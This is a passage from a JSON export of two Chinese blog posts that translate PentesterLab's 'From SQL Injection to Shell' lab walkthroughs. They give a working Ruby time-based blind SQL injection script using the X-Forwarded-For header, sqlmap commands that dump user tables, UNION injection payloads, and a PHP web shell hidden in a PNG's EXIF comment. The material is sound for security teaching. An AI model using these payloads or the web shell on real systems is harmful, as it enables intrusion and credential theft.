II","slug":"From-SQL-Injection-to-Shell-II","date":"2015-03-20T06:28:26.000Z","updated":"2019-08-29T06:29:50.630Z","comments":true,"path":"2015/03/20/From-SQL-Injection-to-Shell-II/","link":"","permalink":"https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/","excerpt":"","text":"简介本课程详细介绍一个基于PHP开发的网站的SQL盲注，以及攻击者如何利用它来访问管理页面。然后，使用该访问，攻击者能够通过配置问题获得服务器上的代码执行。 攻击分为3个步骤： 指纹识别：收集在Web应用使用的技术信息。 SQL注入检测和利用：在这一部分中，您将学习SQL盲注的原理以及如何利用它们来获取信息。 访问管理页面和代码执行：最后一步，你将访问操作系统并且运行代码。 如果你感到合适，你可以尝试发现和利用这些漏洞而不按照课程。你可以在之后回到课程来学习一些你可能没有想到的技巧。 一旦你访问Web应用程序，你将看到下面的页面： 指纹识别指纹识别可以通过使用多个工具。首先通过使用浏览器，将有可能检测到该应用程序是用PHP写的（通过文件扩展名）。 检查HTTP头部信息大量的信息可以通过使用telnet或netcat连接到远程Web应用程序获取，我个人使用netcat，直接通过命令行使用效率更高： 1234567% echo \"HEAD / HTTP/1.1\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\" | netcat vulnerable 80HTTP/1.1 200 OKServer: nginx/0.7.67Date: Wed, 29 May 2013 00:52:49 GMTContent-Type: text/htmlConnection: keep-aliveX-Powered-By: PHP/5.3.3-7+squeeze15 如果你使用 bash ，确保你添加en到命令行：echo -en &quot;HEAD... 我们可以看到，Web服务器使用Nginx并且PHP也被安装了。使用 HEAD 将使你得到所有页面的内容。使用 Connection: close 告诉服务器处理请求后关闭连接。这将确保命令马上返回。 SQL注入检测与利用SQL注入检测该网站提供的SQL注入要找到它有点棘手，尤其是如果你不知道去哪里找。首先，你需要知道SQL注入是盲目的。其次，你不能检测并触发它如果您使用的是浏览器（除了浏览器的扩展用来伪造HTTP流量）。你需要使用一个代理，一个工具（如netcat）或一些代码来找到它。 除了通常的“GPC”猜测：GET参数，POST参数和Cookies；还有其他的值可以用于发现漏洞： User-Agent 。 Host 头。 X-Forwarded-For 和 X-Forwarded-Host 头。 … User-Agent 明显并且易于操作。Host 头有点难度，因为你将需要将主机头从传统的DNS解析中分离出来（（即：您无法直接用浏览器访问[http://‘+or+’1’=’1]/test.php](http://‘+or+’1’=’1]/test.php），因为DNS无法分辨出 ‘+or+’1’=’1）。 注入到主机名，您需要发送您的请求，通过手动或代理在请求中修改 Host 头： 123GET / HTTP/1.1Host: ' or '1'='1[...] 最近，一些公布的漏洞入口点是Host头。一些存在漏洞的函数位于密码重置页面（发送链接是基于Host头）和数据页（页面显示Host的值，没有任何过滤 ）。 通常列表中最后一个是 X-Forwarded-For 头。X-Forwarded-For 是传统用来获取客户端的IP地址。你可能会问为什么PHP代码没有使用TCP连接中的IP地址（例如 $_SERVER[‘REMOTE_ADDR’] ）来代替这个头。X-Forwarded-For 主要用于当应用程序在一个反向代理之后。如果应用使用 $_SERVER[‘REMOTE_ADDR’] 所有请求看起来都是来自于反向代理代替客户（这将打破所有的审计和日志记录机制）。这就是为什么很多应用程序的设计类似于下面的代码： 12345$ip = $_SERVER['REMOTE_ADDR'];if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125; X-Forwarded-For 仅在当应用程序运行在一个反向代理之后时设置，这种代码在大多数情况下工作。然而，这个代码假定攻击者不能伪造这个头。最后，因为开发者认为，IP地址将是一个有效的IPv4地址，他们往往没有进行足够的过滤。 利用这些信息，我们将看到我们如何使用基于时间的SQL盲注。这里的想法是注入一个需要花费很长时间来处理的函数并且观察是否调用该函数，通过观察网页载入的时间。 首先，我们可以很容易地使用命令行发送请求。然而，我们可以看到，发送的有效载荷：hacker ： 1$ echo \"GET / HTTP/1.0\\r\\nX-Forwarded-For: hacker\\r\\nConnection: close\\r\\n\\r\\n\" | netcat vulnerable 80 hacker’ ： 1$ echo \"GET / HTTP/1.0\\r\\nX-Forwarded-For: hacker'\\r\\nConnection: close\\r\\n\\r\\n\" | netcat vulnerable 80 hacker’ or ‘1’=’1 。hacker’ and ‘1’=’1 。 将得到相同的结果，没有简单的方法来发现这个参数是否可以注入。 幸运的是，我们可以使用基于时间的检测，通过检查时间差发现漏洞。我们可以看到这个有效载荷： 1$ echo \"GET / HTTP/1.0\\r\\nX-Forwarded-For: hacker' or sleep(4) and '1'='1\\r\\nConnection: close\\r\\n\\r\\n\" | netcat vulnerable 80 将比这一个花费更多的时间： 1$ echo \"GET / HTTP/1.0\\r\\nX-Forwarded-For: hacker' or sleep(0) and '1'='1\\r\\nConnection: close\\r\\n\\r\\n\" | netcat vulnerable 80 作为使用 ‘1’=’1 结束语句的代替，你可以使用 # 。使用 – 注释掉之后的语句将不工作（用于检索header的函数将除去 – 之后的空格），除非你使用 – -来确保保留空格。 使用 and sleep… 代替 or sleep… 也很重要，MySQL不会执行 sleep() ，如果第一部分（匹配 ip）没有返回 true 。因为我们使用的 hacker （之前没有使用过），它将返回 false 并且 sleep… 会被执行。MySQL的确很聪明，不会测试： Y in X and Y if X returns false. Y in X or Y if X returns right. 你会经常需要到处闲逛以确保代码是很脆弱的，你不要让这种行为变化干扰到。 基于这种差异（之后多测试几次，以确保它不是由于连接的速度），我们可以肯定，这个网站很容易受到SQL注入。 默认情况下，sqlmap并不会测试X-Forwarded-For头的SQL注入。你需要知道工具的局限性并且知道该从哪里开始。 SQL盲注利用手工利用我们要利用传统的SQL盲注，我们有2种情况（true/slow 和 false/quick），基于此，我们可以检索信息。 首先，我们要使用 select @@version 检索一行。一旦我们知道如何去做，我们可以多行。 在这里我们要检索数据库的版本 select @@version 。为此，我们需要获取每个字符的每个字节，通过 select @@version 。 我们的版本是5.0.4，我们需要选择这个字符串的所有字符，通过使用MySQL函数 substring ： 既然我们知道如何提取每个字母（字节）；我们现在就需要提取每个字节的每一位。作为一个例子，让我们看看它如何能做到，以值 5 为例。首先我们需要得到的 5 的ASCII码值使用MySQL函数 *ascii *： 123456mysql&gt; SELECT ascii(&#39;5&#39;);+----------+| ascii(5) |+----------+| 53 |+----------+ 现在，我们需要检索在每个位的值。53 可以代表的二进制值： 00110101 。我们可以使用一个比特位分离出其他内容。分离和检索每一位之后，我们可以在攻击者这边重新构建这个值。 首先，我们需要基础boolean与（&amp;）怎么工作： 我们将使用这些属性来分离每个比特的信息。 我们可以使用 &amp;1 分离第一位： 返回值为第一位是1。此值将产生一个 true 的状态和响应将是缓慢的。 &amp; 用于分离，1用于指明第一位。作为一个说明：2 ^ 0等于1。 我们可以使用 &amp;2来移动到第二位（2^1 等于 2）： 返回值为第二位是0。0将产生一个 false 的状态并且响应会很快。 我们可以继续移动到第三位通过 &amp;4 （2^2 等于 4）： 返回值为第三位1。4值将产生一个 true 的状态并且响应将被推迟。 我们可以继续获取第一个字节的所有位。对于每一位，你将需要添加值（它的结果是true）作为一个变量。这个变量将包含最后的字节，当你检索所有位之后。 我们可以把一切都在2个循环中，每一个字符和当前字符的每一位： 12345678910111213141516171819202122232425262728293031323334353637383940414243require 'socket'inj = \"select @@version\"str = \"\" def test(sql) p = \"hacker' or if((#&#123;sql&#125;),sleep(0.5),0) and '1'='1\" t = Time.now begin s = TCPSocket.new(\"vulnerable\",80) s.write(\"GET / HTTP/1.1\\r\\nHost: vulnerable\\r\\nX-Forwarded-For: #&#123;p&#125;\\r\\nConnection: close\\r\\n\\r\\n\") s.readlines() s.close rescue Errno::ECONNRESET, EOFError end return ((Time.now-t)&gt;0.5)end# dummy initialisation for the while loop# we loop until the returned value is nullvalue = 1i = 0while value != 0 # i is the position in the string i+=1 # initialise to 0 the value we are trying to retrieve value = 0 # for each bit 0.upto(6) do |bit| # 2**bit is 2^bit and will do all the bit masking work sql = \"select ascii(substring((#&#123;inj&#125;),#&#123;i&#125;,1))&amp;#&#123;2**bit&#125;\" if test(sql) # if the returned value is true # we add the mask to the current_value value+=2**bit end end # value is an ascii value, we get the corresponding character # using the `.chr` ruby function str+= value.chr puts strend 你可以通过检索每个结果的大小在开始之前完善这个脚本。停在一个NULL值，不可能正常工作的二进制位置。 现在我们已经有了脚本来检索单行。我们需要改进，使它能够处理多行，可以获取所有的用户。 但首先，让我们看看用户是如何连接数据库，看是否能找到一条捷径去执行代码。了解使用的用户，我们只需要替换我们的有效载荷： 1inj = \"select user()\" 然后运行我们的脚本获取结果： 1234567891011% ruby course/exploit.rbppepenpentpentepentespentestpenteste[...]pentesterlab@localhost 这个用户看起来并没有 FILE 权限。在另一项练习，我们将看到我们如何检查并且得得它的代码执行。 要获取多个行，我们只需要添加另一个循环到脚本中，每次检索一行。我们可以分离每一行行通过使用SQL关键字 LIMIT 。下表说明了 LIMIT 行为： 注：as id 只是用来使MySQL输出更容易阅读。 现在我们知道了如何分离每一行。我们可以通过循环每一行获取所有的结果。我们只需要： 添加一个 index 循环（我们只想要前10个结果）。 在我们的载荷中使用 index 来限制结果的数量。 在获取新行之前重置变量 value ，i 和 str 。 修改后的代码： 1234567891011121314151617index = 0 while index &lt; 10 # using a new variable for the new payload to keep things simple newinj = inj + \" limit #&#123;index&#125;,1\" i = 0 str =\"\" value = 1 while value != 0 [...] 0.upto(6) do |bit| # using the new variable sql = \"select ascii(substring((#&#123;newinj&#125;),#&#123;i&#125;,1))&amp;#&#123;2**bit&#125;\" [...] end index+=1end 当脚本开始循环，你可以杀死它移动到下一个请求。 你可以修改行数在开始运行之前来改善这个脚本。 现在我们知道了如何检索多行，我们可以使用脚本来转储： 表的列表：SELECT table_name FROM information_schema.tables 列的列表：SELECT column_name FROM information_schema.columns 最终，只通过修改载荷来获取信息。 12inj = \"select concat(login,':'password) from users \"[...] 我们可以获取登录密码： 123456789101112131415% ruby exploit.rbaadadmadmiadminadmin:admin:8admin:8eadmin:8efadmin:8efeadmin:8efe3admin:8efe31[...]admin:8efe310f9ab3efeae8d410a8e0166eb2 现在你已经知道了如何手工利用，接下来我们看一下如何使用SQLMap来做到相同的效果。 使用SQLMap进行注入你也可以使用SQLMap来利用这个漏洞。语法是有点棘手，你需要告诉sqlmap在注入点使用 *。这可以通过以下命令： 1$ python sqlmap.py -u \"http://vulnerable/\" --headers=\"X-Forwarded-For: *\" --banner 测试不同的SQL注入方法之后，SQLMap返回如下旗标： 12345678910111213sqlmap identified the following injection points with a total of 109 HTTP(s) requests:---Place: (custom) HEADERParameter: X-Forwarded-For #1* Type: AND/OR time-based blind Title: MySQL &gt; 5.0.11 AND time-based blind Payload: ' AND SLEEP(5) AND \\'tYCW\\'=\\'tYCW[...][14:14:18] [INFO] adjusting time delay to 1 second due to good response times5.1.66-0+squeeze1web application technology: PHP 5.3.3, Nginxback-end DBMS: MySQL 5.0.11banner: '5.1.66-0+squeeze1\\' 我们现在可以获取想要的信息： –dbs 获取数据库列表。 如下： 1234% python sqlmap.py -u \"http://vulnerable/\" --headers=\"X-Forwarded-For: *\" --dbsavailable databases [2]:[*] information_schema[*] photoblog -D photoblog –tables获取表的列表。 如下： 123456789% python sqlmap.py -u \"http://vulnerable/\" --headers=\"X-Forwarded-For: *\" -D photoblog --tablesDatabase: photoblog[4 tables]+------------+| categories || pictures || stats || users |+------------+ -D photoblog -T users –columns获取列的列表。 如下： 1234567891011% python sqlmap.py -u \"http://vulnerable/\" --headers=\"X-Forwarded-For: *\" -D photoblog -T users --columnsDatabase: photoblogTable: users[3 columns]+----------+-------------+| Column | Type |+----------+-------------+| id | mediu || login | varchar(50) || password | varchar(50) |+----------+-------------+ 使用选项--batch告诉SQLMap使用默认行为，避免用户数据。 最后，你可以转储表 users （SQLMap将允许你自动破解密码）用以下命令： 123456789% python sqlmap.py -u \"http://vulnerable/\" --headers=\"X-Forwarded-For: *\" -D photoblog -T users --dump --batchDatabase: photoblogTable: users[1 entry]+----+-------+---------------------------------------------+| id | login | password |+----+-------+---------------------------------------------+| 1 | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |+----+-------+---------------------------------------------+ 你也可以使用 –dump-all 如果你想得到所有的数据库内容（可能很慢）。你也可以使用 –exclude-sysdbs 避免转储系统数据库/表而只检索那些默认不存在的。 访问管理页面和代码执行进入管理界面的第一步是破解你获取到的密码。除非你已经用SQLMap破解了它，你可以使用这个练习的第一个版本，按照提供的步骤。否则，你可以使用谷歌来破解它。 上传WebShell并且执行代码当你遇到一个上传功能，下面的步骤可以遵循的： 确保文件上传在web根目录（所以你可以访问它并且得到它的解析）。 确保代码检查的文件扩展名，它不能绕过。 确保代码检查的内容类型，它不能绕过。 通过使用一个合法的图像（.png , .jpg 或 .gif 文件），我们可以看到，文件会在网站根目录上传，被改名为基于当前时间，该文件的扩展名仍然保持。 如果你想上传一个PHP扩展名文件，不同于.png , .jpg 或 .gif 。文件会被拒绝。看起来不能绕过。 如果你想上传一个文件以正确的扩展名但没有合适的内容（如文本文件命名为 test.jpg ），文件也被拒绝。 最后，如果你想上传一个文件以正确的扩展，正确的内容但有一个小的内容修改（用 vi 添加额外的话），该文件也被拒绝了。 唯一的可能是上传一个有效的文件去执行代码。我们还注意到，该文件没有被PHP代码调整大小。 2010年， 80sec.com 发布了nginx文件类型错误解析漏洞http://www.80sec.com/nginx-securit.html（中文）。这个问题也在Neal Poole in 2011https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/进行过详细的说明。 基本上，如果Nginx/PHP配置不正确，当有人访问URL：http://vulnerable/admin/uploads/hacker.png/x.php时，文件 hack.png 会被解析成PHP代码。 我们可以利用这个错误配置获得代码执行在服务器上仅仅通过上传恶意的图像。然而，在我们测试之前，该文件必须是一个有效的图像。我们需要找到一种方法将PHP代码注入到图像的同时保持一个有效的文件。 一个简单的方法是把我们的有效载荷内作为一个评论注入到图像的EXIF区域。这可以通过使用工具 exiftool 做到。gd库被很多PHP应用用来删除EXIF数据，当图像被调整大小。幸运的是，这里的情况不是这样的，。它仍然是值得测试的因为很多人（特别是照片）想要保留这些信息，即使图像可以调整大小，仍然决定离开gd到ImageMagick。 首先，我们需要创建载荷（shell.php）： 1&lt;?php system($_GET['c']); ?&gt; 然后我们可以使用 exiftool 把我们的载荷注入到图像中： 1% exiftool \"-comment&lt;=shell.php\" malicious.png 最后，我们需要确保一切都是好的（在调试浪费时间之前）： 12% strings malicious.png | grep system&lt;?php system($_GET['c']); ?&gt; 我们现在可以上传自己的图像。一旦上传，我们需要通过检查网页的源文件来检索路径。我们可以通过添加“PHP扩展”和我们要运行的命令来访问图像。例如，如果上传的文件被命名为 1369904954.png ,我们可以访问http://vulnerable/admin/uploads/1369904954.png/c.php?c=uname%20-a来执行代码。 总结这个练习将教你如何手动检测和利用SQL盲注获得一个网站管理页面。一旦进入“信任区”，更多可用的功能将产生更多的漏洞。这个练习是一个很好的例子有多小技巧可以影响Web服务器的性能并且允许攻击者控制它。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pentesterlab","slug":"Pentesterlab","permalink":"https://darkwing.moe/tags/Pentesterlab/"}]},{"title":"From SQL Injection to Shell","slug":"From-SQL-Injection-to-Shell","date":"2015-03-16T07:11:07.000Z","updated":"2019-08-28T07:12:13.358Z","comments":true,"path":"2015/03/16/From-SQL-Injection-to-Shell/","link":"","permalink":"https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/","excerpt":"","text":"简介课程内容：基于PHP的站点的SQL注入，攻击者可以使用它来访问管理页面。然后，使用该访问，攻击者就能获得服务器上的代码执行。 攻击分为3个步骤： 指纹识别：收集Web应用的技术信息。 SQL注入检测和利用：在这一部分中，您将学习SQL注入的原理和如何利用它们来获取信息。 访问管理页面和代码执行：最后一步，您将访问操作系统和运行命令。 指纹识别指纹识别可以通过使用多个工具。首先通过使用浏览器，将有可能检测到该应用程序是用PHP写的。 检查HTTP头部信息大量的信息可以通过使用telnet或netcat连接到远程Web应用程序获取： 1$ telnet vulnerable 80 PS： vulnerable是主机名或服务器的IP地址； 80是由Web应用程序使用的TCP端口（80是HTTP默认值）。 通过发送以下HTTP请求： 12GET / HTTP/1.1Host: vulnerable 它有可能获取到PHP版本和Web服务器信息，仅仅通过观察服务器发送回的HTTP响应报头的： 1234567HTTP/1.1 200 OKDate: Thu, 24 Nov 2011 04:40:51 GMTServer: Apache/2.2.16 (Debian)X-Powered-By: PHP/5.3.3-7+squeeze3Vary: Accept-EncodingContent-Length: 1335Content-Type: text/html 这里的应用程序只能通过HTTP（没有运行在端口443）。如果应用程序只能通过HTTPS，telnet或netcat就无法与服务器进行通信，可以使用openssl工具： 1$ openssl s_client -connect vulnerable:443 PS： vulnerable是主机名或服务器的IP地址； 443是由Web应用程序使用的TCP端口（443是HTTPS的默认值）。 使用应用程序如Burp Suite（http://portswigger.net/）设置为代理可以很容易地获取相同的信息： 使用目录扫描wfuzz工具（http://www.edge-security.com/wfuzz.php）可以用来暴力检测Web服务器上的目录和页面。下面的命令可以检测远程文件和目录： 1$ python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ 使用以下选项： –hc 404 告诉wfuzz如果响应代码404则忽略响应（页面未找到） -z file -f wordlists/big.txt 告诉wfuzz文件使用文件 wordlists/big.txt 作为字典破解远程目录的名称。 http://vulnerable/FUZZ 告诉wfuzz在URL中替换 FUZZ 的每个在字典中找到的值。 wfuzz也可以用来检测服务器上的PHP脚本： 1$ python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php SQL注入检测SQL入门为了理解，检测和利用SQL注入，你需要了解标准查询语言（SQL）。SQL允许开发人员执行以下需求： 使用 SELECT 语句检索信息； 使用 UPDATE 语句更新信息； 使用 INSERT 语句添加新的信息； 使用 DELETE 语句删除信息。更多的操作（创建/删除/修改表，数据库或触发器）是可用的但不太可能被用于Web应用程序。 网站最常用的查询语句是 SELECT ，用于从数据库中检索信息。 SELECT 语句的语法如下： 1SELECT column1, column2, column3 FROM table1 WHERE column4='string1' AND column5=integer1 AND column6=integer2; 在该查询中，以下信息提供给数据库： SELECT语句表示要执行的操作：检索信息； 列的列表显示哪些列被请求； FROM table1 表示从哪一个表获取记录； 语句之后的 WHERE 是用来指示记录应满足什么条件。string1 的值是由单引号限定，整数 integer1 和 integer2 可以通过一个单引号分隔（ integer2 ）或直接放在查询中（ integer1 ）。 例如下面的请求： 1SELECT column1, column2, column3 FROM table1 WHERE column4='user' AND column5=3 AND column6=4; 会从下面的表中检索： 使用之前的查询语句，下面的结果将被检索： 我们可以看到，只有这些值被返回，因为它们是匹配所有 WHERE 中的声明条件。如果你阅读一些处理数据库的源代码，你会经常看到 SELECT * FROM tablename 。 * 是一个通配符请求数据库返回所有列并避免指明它们的名称。 基于整数检测由于显示错误信息，很容易检测到网站的任何漏洞。SQL注入可以使用任何下列方法检测。所有这些方法都是基于数据库的一般行为，发现和利用SQL注入取决于很多不同的因素，这些方法本身并不是100%的可靠。这就是为什么你需要尝试它们中的几种去确定给定的参数是存在漏洞的。让我们以一个购物网站为例子，访问的URL /cat.php?id=1，你会看到图片article1。下表显示你会看到的不同的ID值： 后台的PHP代码如下： 123456&lt;?php$id = $_GET[\"id\"];$result= mysql_query(\"SELECT * FROM articles WHERE id=\".$id);$row = mysql_fetch_assoc($result);// ... display of an article from the query result ...?&gt; 用户提供的值（ $_GET[“id] ）被直接用于SQL请求语句中。例如，访问的URL： /article.php?id=1 将产生以下请求： SELECT * FROM articles WHERE id=1 /article.php?id=2 将产生以下请求： SELECT * FROM articles WHERE id=2如果用户试图访问URL /article.php?id=2&#39; ，下列请求将被执行 SELECT * FROM articles WHERE id=2&#39; 。然而，这个SQL请求因为单引号，语法错误，数据库将抛出一个错误。例如，MySQL会抛出如下错误信息： You have an error in your SQL syntax; check themanual that corresponds to your MySQL serverversion for the right syntax to use near&#39;&#39;&#39; at line 1 此错误消息是否在HTTP响应中可见取决于PHP配置。 在URL中提供的值是直接用于请求语句并且被视为一个整数，这允许你查询数据库并且执行基本的数学运算： 如果你试图访问 /article.php?id=2-1 ，下面的请求将被发送到数据库 SELECT * FROM articles WHERE id=2-1 ，并且article1的信息将在网页上显示，因为这次查询等价于 SELECT * FROM articles WHERE id=1 （减法将由数据库自动执行）。 如果你试图访问 /article.php?id=2-0 ，下面的请求将被发送到数据库 SELECT * FROM articles WHERE id=2-0 ，并且article2的信息将在网页上显示，因为这次查询等价于 SELECT * FROM articles WHERE id=2 。 这些特性提供了一个很好的检测SQL注入的方法： 如果访问 /article.php?id=2-1 显示article1并且访问 /article.php?id=2-0 显示article2，减法是由数据库来完成的，那么你可能发现了一个SQL注入。 如果访问 /article.php?id=2-1 显示article2并且访问 /article.php?id=2-0 也显示article2，你可能没有一个基于整数的SQL注入，但你可能有一个基于字符串的SQL注入，正如我们将看到的。 如果你把一个引号放入URL中（ /article.php?id=1&#39; ），你应该收到一个错误。 如果一个值是一个整数（例如categorie.php?id=1），它可以被当作字符串用于SQL语句中：SELECT * FROM categories where id=&#39;1&#39;.这是SQL允许使用的语法，但在SQL语句中使用字符串会比使用整数慢。 基于字符串检测正如我们之前在“SQL入门”中看到的，SQL语句中的字符串值被放在引号当中（例如&#39;test&#39;）： 1SELECT id,name FROM users where name='test'; 如果SQL注入是在网页中，注入一个单引号 &#39; 将打破查询语法并且产生错误。另外，注入2次单引号 &#39; &#39; 不会打破查询。作为一般规则，奇数单引号将抛出一个错误，偶数单引号不会。 它也可以注释掉查询语句的末尾，因此在大多数情况下，你不会得到一个错误（这取决于查询的格式）。你可以用 &#39;– 来注释掉末尾。 例如下面的查询，在test处有一个注入点： 1SELECT id,name FROM users where name='test' and id=3; 会变成： 1SELECT id,name FROM users where name='test' -- ' and id=3; 并且会被解释为： 1SELECT id,name FROM users where name='test' 然而这个测试仍然可能产生一个错误，如果查询如下模式： 1SELECT id,name FROM users where ( name='test' and id=3 ); 由于右括号会因为末尾的注释而消失。你可以尝试一个或多个括号来查找一个值使它不会产生错误。 另一种方式来测试它，是使用 &#39; and &#39;1&#39;=&#39;1 ，这种注入不太可能影响查询，因为它不太可能打破语法。例如，在之前的查询中采用这种方式注入，我们可以看到语法仍然是正确的。 1SELECT id,name FROM users where ( name='test' and '1'='1' and id=3 ); 此外， &#39; and &#39;1&#39;=&#39;1 不太可能影响的请求和结果，因为有没有注入的语义可能是相同的。我们可以通过使用注入 &#39; and &#39;1&#39;=&#39;0 产生的页面来与它比较，虽然并没有产生错误，但改变了查询的语义。SQL注入并不是一门精确的科学，很多东西都会影响到你的测试结果。如果你遇到这些，继续测试注入，尝试测试出后台代码来确认它是一个SQL注入。为了找到SQL注入，你需要访问网站并且使用这些方法测试每一个页面的每一个参数。一旦你发现了SQL注入，你可以到下一节去学习如何利用它。 SQL注入利用现在我们网页 http://vulnerable/cat.php 发现了一个SQL注入，为了更进一步，我们需要利用它来检索信息。为此，我们需要了解SQL中使用的 UNION 关键字。 UNION关键字 UNION 声明是用来把两次请求的信息放在一起： 1SELECT * FROM articles WHERE id=3 UNION SELECT ... 因为它是用来从其他表中检索信息，它可以用来作为一个SQL注入的有效载荷。请求的开始不能被攻击者直接修改，因为它是由PHP代码生成的。然而使用UNION，攻击者可以操纵查询的结束并且从其他表中检索信息： 12SELECT id,name,price FROM articles WHERE id=3 UNION SELECT id,login,password FROM users 最重要的规则是两次查询返回的列的类型相同，否则数据库将触发一个错误。 使用UNION利用SQL注入使用UNION利用SQL注入遵循下面的步骤： 找出列数用来执行UNION 找出哪些列被显示在页面上 从元表数据库中检索信息 从其他表或数据库中检索信息 为了执行SQL注入的请求，你需要找到所查询的第一部分返回的列数。你需要猜这个数，除非你有应用程序的源代码。 有两种方法得到这个信息： 使用 UNION SELECT 和增加列数； 使用 ORDER BY 语句。 如果你尝试 UNION 并且两个查询返回的列数是不同的，数据库将抛出一个错误： 1The used SELECT statements have a different number of columns 可以使用这个属性来猜列数。例如，如果你可以注入以下语句： SELECT id,name,price FROM articles where id=1 ，你可以采用以下步骤： SELECT id,name,price FROM articles where id=1 UNION SELECT 1 ,注入内容 1 UNION SELECT 1 将返回一个错误因为查询语句的两个子部分的列数是不同的； SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2 ，因为如上同样的原因，注入内容 1 UNION SELECT 1,2 会返回一个错误； SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3 ，因为两个子部分拥有相同的列数，此查询不会抛出错误。你甚至可以在页面或页面的源代码中，看到一个数字。 注：本项目为MySQL，使用的的方法与其他数据库略有不同，值1,2,3…应该改成null,null,null…,如果数据库要求 UNION 两边的部分相同的值类型。例如Oracle，当使用SELECT时需要使用FROM，可以使用dual表来完成请求： UNION SELECT null,null,null FROM dual 另一种方法是利用关键字 ORDER BY 。 ORDER BY 主要用来告诉数据库哪些列被用于排序结果： 1SELECT firstname,lastname,age,groups FROM users ORDER BY firstname 上述请求将返回users表按照firstname排序后的结果。 ORDER BY 也可以用一个整数告诉数据库排序的列数 X： 1SELECT firstname,lastname,age,groups FROM users ORDER BY 3 上述请求将返回users表按照第3列排序后的结果。此功能可用于检测列数，如果表中的列数大于 ORDER BY 查询中的列数，则抛出一个错误（例如10）： 1Unknown column '10' in 'order clause' 可以使用这个属性来猜列数。例如，如果你可以注入以下语句： SELECT id,name,price FROM articles where id=1 ，你可以采用以下步骤： SELECT id,name,price FROM articles where id=1 ORDER BY 5 ，注入内容 1 ORDER BY 5 将返回一个错误，因为查询的第一部分列数小于5； SELECT id,name,price FROM articles where id=1 ORDER BY 3 ，注入内容 1 ORDER BY 3 不会返回错误，因为查询的第一部分列数大于或等于3； SELECT id,name,price FROM articles where id=1 ORDER BY 4 ，注入内容 1 ORDER BY 4 将返回一个错误，因为查询的第一部分列数小于4。 基于这种二分法的搜索，我们可以知道列数是3，我们现在可以利用这些信息来建立最终的查询： 1SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3 尽管在本例中这种方法使用了相同的请求数，但它的速度会明显加快，当列数增长时。 检索信息现在我们已经知道了列数，我们可以从数据库中检索信息。基于我们收到的错误信息，我们知道后台使用的数据库是 MySQL 。利用这些信息，我们可以迫使数据库执行一个函数或给我们发送信息： 通过PHP应用程序连接到数据库的用户信息，使用 current_user() 数据库版本信息，使用 version() 为了实现这些，我们需要在之前的语句（ UNION SELECT 1,2,3 ）中用我们想要执行的函数替换掉一个值，然后在响应中检索信息。确保你总是保持列数正确当你试图检索信息时。 例如你可以访问以下URL来获取这些信息： 数据库版本： http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4 当前用户： http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,current_user(),3,4 当前数据库： http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,database(),3,4 我们现在能够从数据库中检索信息并且检索任意内容。为了获取当前应用程序的相关信息，我们需要： 当前数据库中的所有表的名称 我们想要从中检索信息的表中列的名称 MySQL提供了包含有关数据库，表，列信息的元信息表，MySQL 5版本及以上。我们将使用这些表来获取我们需要的最终要求信息。这些表存储在数据库 information_schema 中。下面的查询可用于检索： 所有表的列表： SELECT table_name FROM information_schema.tables 所有列的列表： SELECT column_name FROM information_schema.columns 通过混合这些查询和以前的URL，你可以猜出什么网页访问用于信息检索： 表的列表： 1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables 列的列表： 1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns 问题是，这些查询语句为您提供所有表和列的列表，但在数据库中查询和检索感兴趣的信息，你需要知道哪些列属于哪些表。幸好， information_schema.columns 表中储存有列名。 1SELECT table_name,column_name FROM information_schema.columns 获取这些信息，我们可以 把表名和列名放在不同的注射位置： 1 UNION SELECT 1, table_name, column_name,4 FROM information_schema.columns 在同一个注入位置使用 CONCAT 连接表名和列名： 1 UNION SELECT 1,concat(table_name,&#39;:&#39;, column_name),3,4 FROM information_schema.columns 。 &#39;:&#39; 很容易分割查询结果。 如果你想轻松的在结果页面使用正则表达式检索信息（比如你想写一个SQL注入的脚本），你可以使用一个标记在注入内容 ``1 UNION SELECT 1,concat(‘^^^’,table_name,’:’,column_name,’^^^’) FROM information_schema.columns` 中。它很容易在页面中匹配结果。 你现在有表和它们的列的列表，第一个表和列是默认的MySQL表。在HTML页面的最后，我们可以看到一个表的列表可能被目前的应用所使用： 使用此信息，您现在可以创建一个查询，从该表中检索信息： 11 UNION SELECT 1,concat(login,':',password),3,4 FROM users; 并获取用户名和密码用于访问管理页面： 该SQL注入提供和访问数据库连接的应用程序使用用户相同的权限(current_user())…这就是为什么当你在部署WEB应用的时候尽可能给它的用户最低权限。 访问管理页面和代码执行 破解密码使用2种不同的方法可以很容易的破解密码： 一个搜索引擎 John-The-Ripper http://www.openwall.com/john/ 如果哈希值无盐，它可以轻易被破解，通过使用搜索引擎像谷歌。因为，只要搜索哈希，你将在很多网站看到你的密码的明文版： John-The-Ripper可以用来破解这个密码，最现代的Linux发行版包括一个版本的John，为了破解这个密码，你需要告诉John什么算法被用于加密。对于Web应用程序，一个好的猜测是MD5。在大多数的Linux发行版中，只提供支持少数格式的John-The-Ripper版本。你可以运行John不带任何参数，从使用信息中获取支持的格式列表。例如在Fedora，支持以下格式： 1234$ john# ...usage information...--format=NAME force hash type NAME: DES/BSDI/MD5/BF/AFS/LM/crypt# ...usage information... 不幸的是，这个有效的MD5并不是通过PHP的md5函数M创建的。为了破解这个密码，我们将需要一个支持raw-md5的新版本John。官网提供有支持raw-md5的社区增强版。 现在我们需要给John提供正确的格式信息，我们需要把用户名和密码放在同一行用冒号“：”分开。 1admin:8efe310f9ab3efeae8d410a8e0166eb2 下面的命令行可以用来在破解密码之前检索： 